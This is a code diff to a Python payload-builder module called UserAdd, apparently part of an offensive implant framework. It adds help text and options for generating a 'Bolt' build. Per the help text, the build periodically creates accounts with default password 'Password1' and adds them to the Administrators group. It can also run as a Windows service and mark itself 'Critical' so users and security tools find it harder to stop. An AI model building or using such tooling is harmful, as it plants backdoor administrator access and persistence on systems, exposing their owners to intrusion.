@@ -21,24 +21,60 @@ from include.builder import random_chars
 from argparse import BooleanOptionalAction
 from include.manager import Manager, is_str, is_int
 
-_HELP_TEXT = """ Generates a Bolt build based on the supplied profile and behavior arguments.
+_HELP_TEXT = """ Generates a UserAdd build based on the supplied profile and behavior
+ arguments.
 
  Arguments
-  CGO Build Arguments
-   -T                 <thread_name>   |
-   --thread
-   -F                 <function_name> |
-   --func
+   UserAdd Specific Arguments
+   -p                 <period(secs)>  Specify the time period (in seconds) that this
+   --period                             UserAdd service will wait before triggering
+                                        another creation cycle. This value cannot be
+                                        zero. It is recommended to set this value to
+                                        be higher than 5 seconds.
+   --flag             <file_path>     Specify an optional on-target file path that will
+                                        indicate that the service should start creating
+                                        users. If not submitted, this will start creation
+                                        on service start.
 
-  Flurry Specific Arguments
-   -p                 <period(secs)>  |
-   --period
+   UserAdd Created User Arguments
+   --user             <username>      Specify the username to be used as the "loginname".
+                                        This is the value that will be prefixed with
+                                        "_<number>" and can be used to login with. If
+                                        not specified, this defaults to "JohnCena"
+   --password         <password>      Specify the password to be used for logging into
+                                        the created accounts. If not specified, this
+                                        defaults to "Password1".
+   --fullname         <full_name>     Specify the Full Name (Display Name) of the
+                                        created users. This value does not change per
+                                        user. If not specified, this defaults to
+                                        "John Cena".
+   --comment          <user_comment>  Specify the user comment of the created users.
+                                        This is empty if not specified.
+   --group            <admin_gropup>  Specify the name of the Group to add the newly
+                                        created user accounts. This defaults to
+                                        "Administrators" if not specified.
 
   Behavior Arguments
-   -A                 <service_name>  |
-   --service-name
-   -K
-   --critical
+   -S                                 Enable the Bolt to be built into a Service/Daemon
+   --service                            build. On Windows, it must be launched via SCM.
+                                        This does not take any effect on non-Windows
+                                        devices.
+   -A                 <service_name>  Specify the name of the Service to be used when
+   --service-name                       running as a Service. This has no effect when
+                                        not running as a Service and realistically only
+                                        has a purpose when running as a Service DLL on
+                                        Windows.
+   -K                                 Enable or disable the ability for this build to
+   --critical                           mark itself as "Critical" which makes it harder
+                                        to be stopped by users or solutions. This only
+                                        takes effect on Windows devices when ran with
+                                        administrative privileges.
+
+  CGO Build Arguments
+   -T                 <thread_name>   Supply the thread name to be used in the
+   --thread                             generated C stub file.
+   -F                 <function_name> Supply the function name to be used in the
+   --func                               generated C stub file.
 """
 
 
@@ -55,6 +91,7 @@ class UserAdd(object):
         self._m.verify(cfg)
 
     def config_load(self, cfg):
+        # UserAdd Options
         self._m.add("flag", ("--flag",), "", is_str(True), str)
         self._m.add("period", ("-p", "--period"), 30, is_int(1), int)
         self._m.add("user_comment", ("--comment",), "", is_str(True), str)
@@ -62,12 +99,15 @@ class UserAdd(object):
         self._m.add("user_pass", ("--password",), "Password1", is_str(False), str)
         self._m.add("user_fullname", ("--fullname",), "John Cena", is_str(True), str)
         self._m.add("admin_group", ("--group",), "Administrators", is_str(False), str)
+        # Behavior/Type Options
         self._m.add("service_name", ("-A", "--service-name"), "", is_str(True), str)
-        self._m.add("func", ("-F", "--func"), "", is_str(True, ft=True), str)
-        self._m.add("thread", ("-T", "--thread"), "", is_str(True, ft=True), str)
+        self._m.add("service", ("-S", "--service"), False, action=BooleanOptionalAction)
         self._m.add(
             "critical", ("-K", "--critical"), False, action=BooleanOptionalAction
         )
+        # CGO Build Options
+        self._m.add("func", ("-F", "--func"), "", is_str(True, ft=True), str)
+        self._m.add("thread", ("-T", "--thread"), "", is_str(True, ft=True), str)
         self._m.init(cfg)
 
     def args_pre(self, parser):
@@ -77,7 +117,29 @@ class UserAdd(object):
         self._m.parse(cfg, args)
 
     def print_options(self, cfg, root, file):
-        return
+        print("- | UserAdd Generator", file=file)
+        print(f'- | = {"User Name:":20}{cfg["user_name"]}', file=file)
+        print(f'- | = {"Password:":20}{cfg["user_pass"]}', file=file)
+        print(f'- | = {"Full Name:":20}{cfg["user_fullname"]}', file=file)
+        print(f'- | = {"Comment:":20}{cfg["user_comment"]}', file=file)
+        print(f'- | = {"Admin Group:":20}{cfg["admin_group"]}', file=file)
+        print(f'- | = {"Creation Period:":20}{cfg["period"]}', file=file)
+        if nes(cfg["flag"]):
+            print(f'- | = {"Flag File:":20}{cfg["flag"]}', file=file)
+        print(f'- | = {"Critical:":20}{cfg["critical"]}', file=file)
+        print(f'- | = {"Service:":20}{cfg["service"]}', file=file)
+        if cfg["service"]:
+            print(f'- | = {"Service Name:":20}{cfg["service_name"]}', file=file)
+        if not root.get_option("cgo"):
+            return
+        if nes(cfg["thread"]):
+            print(f'- | = {"CGO Thread:":20}{cfg["thread"]}', file=file)
+        else:
+            print(f'- | = {"CGO Thread:":20}[random]', file=file)
+        if nes(cfg["func"]):
+            print(f'- | = {"CGO Func:":20}{cfg["func"]}', file=file)
+        else:
+            print(f'- | = {"CGO Func:":20}[random]', file=file)
 
     def run(self, cfg, base, workspace, templates):
         p = join(base, "bolt.go")
